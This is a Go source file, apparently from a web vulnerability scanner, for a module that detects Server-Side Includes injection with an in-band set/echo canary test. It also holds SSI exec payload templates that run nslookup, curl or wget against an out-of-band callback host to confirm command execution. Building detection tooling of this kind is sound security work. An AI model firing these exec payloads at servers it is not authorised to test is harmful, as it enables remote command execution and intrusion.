package ssi_injection

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

// ssiVar is the fixed SSI variable name used by the echo differential. It only has
// to be a valid identifier; the varying, unguessable part is the value (the canary).
const ssiVar = "vgnssi"

// ssiExecTemplates render an SSI exec directive that reaches the collaborator over
// different channels. nslookup exercises DNS-only egress; curl/wget exercise an HTTP
// fetch (a stronger, higher-confidence signal). One host is minted per template so a
// callback pinpoints the exact directive that fired.
var ssiExecTemplates = []func(host string) string{
	func(h string) string { return `<!--#exec cmd="nslookup ` + h + `"-->` },
	func(h string) string { return `<!--#exec cmd="curl http://` + h + `"-->` },
	func(h string) string { return `<!--#exec cmd="wget -q -O- http://` + h + `"-->` },
}

// Module implements the Server-Side Includes injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new SSI injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rhm: dedup.LazyDefaultRHM("ssi_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint tests a single insertion point for SSI injection. It runs an
// in-band directive-echo differential first (Firm), then fires out-of-band exec
// directives whose callbacks arrive asynchronously.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}
	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return nil, nil
	}

	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), ip.Name(), ip.BaseValue(), fmt.Sprintf("%d", ip.Type())) {
			return nil, nil
		}
	}

	// Tech-stack pre-filter: SSI is evaluated only on HTML documents. Skip a non-HTML
	// observed response outright; the echo differential below re-checks the fuzzed
	// response's content-type and also derives reachability, so no separate probe is
	// needed.
	if r := ctx.Response(); r != nil && modkit.ClassifyContentType(r.Header("Content-Type")) != modkit.ContentClassHTML {
		return nil, nil
	}

	var results []*output.ResultEvent

	// In-band echo differential (Firm): a set/echo directive whose value is emitted
	// only when the server evaluates SSI, with the directive markup consumed. Round 1
	// also determines reachability (input reflected into an HTML page).
	confirmed, reached, raw, full := m.confirmEchoDifferential(ctx, ip, httpClient)
	if confirmed {
		results = append(results, &output.ResultEvent{
			URL:              urlx.String(),
			Matched:          urlx.String(),
			Request:          string(raw),
			Response:         full,
			FuzzingParameter: ip.Name(),
			ExtractedResults: []string{"SSI set/echo directive evaluated; directive markup consumed"},
			Info: output.Info{
				Name:        ModuleName,
				Description: ModuleDesc,
				Severity:    ModuleSeverity,
				Confidence:  ModuleConfidence,
				Tags:        ModuleTags,
			},
		})
		return results, nil
	}

	// Out-of-band exec (async): even where directive output is not evaluated in band,
	// an SSI exec directive can reach the collaborator — but only fire it when the
	// input actually reached an HTML page, the necessary SSI precondition. Findings
	// arrive via OAST polling.
	if reached {
		m.fireExecOAST(ctx, ip, httpClient, scanCtx, urlx.String())
	}

	return results, nil
}

// confirmEchoDifferential sends a set/echo SSI directive with a fresh unguessable
// value across two rounds. A round confirms only when the value is emitted AND the
// directive markup is NOT present verbatim in the response — i.e. the server evaluated
// the SSI (consuming the directive) rather than reflecting it. Round 1 doubles as the
// reachability gate: the response must be HTML and must contain the canary (so the
// input reaches the parsed page), which replaces a separate reachability request.
// reached is true once the input is seen in an HTML body, even if SSI did not evaluate,
// so the caller can still try the out-of-band exec route. The full response is built
// only on the final (reported) round.
func (m *Module) confirmEchoDifferential(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
) (confirmed, reached bool, raw []byte, full string) {
	const rounds = 2
	for i := 0; i < rounds; i++ {
		canary := strings.ToLower(modkit.FreshCanary())
		payload := fmt.Sprintf(`<!--#set var="%s" value="%s"--><!--#echo var="%s"-->`, ssiVar, canary, ssiVar)
		fuzzedRaw := ip.BuildRequest([]byte(payload))
		req := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(req, http.Options{NoClustering: true})
		if err != nil {
			return false, reached, nil, ""
		}
		r := resp.Response()
		body := ""
		if r != nil {
			body = resp.Body().String()
		}

		if i == 0 {
			if r == nil ||
				modkit.ClassifyContentType(r.Header.Get("Content-Type")) != modkit.ContentClassHTML ||
				!strings.Contains(body, canary) {
				resp.Close()
				return false, false, nil, ""
			}
			reached = true
		}

		if !ssiEvaluated(body, canary) {
			resp.Close()
			return false, reached, nil, ""
		}
		if i == rounds-1 {
			raw = fuzzedRaw
			full = resp.FullResponseString()
		}
		resp.Close()
	}
	return true, true, raw, full
}

// ssiEvaluated reports whether body shows SSI evaluation: the canary was emitted and
// the raw directive tokens were consumed (not reflected verbatim). A server that
// merely echoes the payload keeps the "#set"/"#echo" tokens, so requiring their
// absence rejects plain reflection — the dominant false positive.
func ssiEvaluated(body, canary string) bool {
	if !strings.Contains(body, canary) {
		return false
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, "#echo") || strings.Contains(lower, "#set") {
		return false
	}
	return true
}

// fireExecOAST injects SSI exec directives, one collaborator host per template, so a
// callback confirms server-side command execution via SSI out of band.
func (m *Module) fireExecOAST(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
	urlStr string,
) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return
	}
	requestHash := ctx.Request().ID()
	for _, tmpl := range ssiExecTemplates {
		host := oast.GenerateURL(urlStr, ip.Name(), "ssi-injection command execution", ModuleID, requestHash)
		if host == "" {
			return
		}
		payload := tmpl(host)
		oast.RecordPayload(host, payload)
		fuzzedRaw := ip.BuildRequest([]byte(payload))
		req := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())
		resp, _, err := httpClient.Execute(req, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return
			}
			continue
		}
		resp.Close()
	}
}
